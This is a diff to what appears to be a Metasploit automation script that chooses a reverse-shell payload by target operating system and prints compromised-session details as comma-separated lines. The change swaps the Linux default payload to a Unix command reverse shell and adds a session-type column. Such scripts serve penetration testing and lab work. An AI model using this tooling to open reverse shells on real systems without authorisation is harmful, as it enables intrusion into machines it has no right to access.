@@ -92,11 +92,11 @@ sub determinePayload {
    if ($1 == "windows") {
       return "windows/meterpreter/reverse_tcp";
    }
-   return "linux/x86/meterpreter/reverse_tcp";
+   return "payload/cmd/unix/reverse";
 }
 
 on sessionHandle {
-   local('$console %out @ids $flag $sessionNum $host $user %r $exploit');
+   local('$console %out @ids $flag $sessionNum $host $user %r $exploit $type');
    
    @ids = session_ids();
    %out = sessions();
@@ -110,8 +110,9 @@ on sessionHandle {
    	$host = %r["host"];
    	$user = %r["username"];
    	$exploit = split('/', %r["via_exploit"], 2)[1];
+      $type = %r["type"];
 
-   	println("$host" . "," . "$flag" . "," . "$sessionNum" . "," . "$user" . "," . "$exploit");
+   	println("$host" . "," . "$flag" . "," . "$sessionNum" . "," . "$user" . "," . "$exploit" . "," . "$type");
    }
    quit();
 }
@@ -120,5 +121,5 @@ on noSessions {
    local('$host');
    $host = $1;
 
-   println("$host" . ",false,0,0,0");
+   println("$host" . ",false,0,0,0,0");
 }
